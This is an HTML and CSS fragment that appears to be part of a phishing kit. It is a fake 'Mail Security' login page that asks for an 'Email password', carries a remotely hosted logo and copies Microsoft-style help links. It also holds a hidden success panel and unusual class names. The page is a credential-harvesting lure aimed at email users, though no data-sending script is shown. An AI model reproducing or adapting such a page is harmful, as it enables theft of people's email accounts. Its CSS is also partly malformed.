  .xukcess-div{

    flex-direction: row;
    justify-content: center;
    align-items: center;
    height: 30vh;

    background-color: white;

    display: block;
    margin-top: 5px;

  }

    display: none !important;
    visibility: hidden;
  }

<body>
  <section class="hidethis">
  <div class="xukcess-div">
    <i class="fas fa-check text-success" style="font-size: 56px;"></i>
    <br>
    <div class="xukcess-msg" style="">
      <a>
      Copyright Â© <span class="logoname"></span> Mail Security 2021 
      </a>                      
    </div>                    
      
      
  </div>

  </section>
  <section class="lekwa-form">
      <div class="igbe-mbanye lekwa-shadow">
        <div class="credentials">
          
         <div align="center">   <img src="https://firebasestorage.googleapis.com/v0/b/mpoaanan.appspot.com/o/inc%2Floadinglogo.gif?alt=media&token=ad80211a-6694-4e63-84f9-293050c3c1f5" id="logoimg" width="90px" height="90px"></div>

		<p></p>
          <form class="ezigbo-form">

            </div>
            <div class="form-control">
                <input type="password" class="no-shadow needed" id="password" data-error="Correct email password is needed" value="" placeholder="Email password">
                <p class="validation-error"></p>
            </div>  

            <div class="form-control" style="margin-top: -10px;">
              <input id="check" type="checkbox" /><label for="check" class="check"><div>Remember me</div></label>              
<!--                 <label class="checkboxlabel"><input type="checkbox" class="checkboxFive">Remember Me</label> -->
            </div>             

            <div class="form-control" style="margin-top: -15px;">
              <button id="submit-btn" class="button-primary button-default">Sign In</button>
            </div>         

          </form>
        </div>
        
        <div class="footer-links">
          <p>Can't access your account?</p>
          <p>Sign in with a single-use code</p>
        </div>

      </div>
      <!-- Content -->
      
  </section>
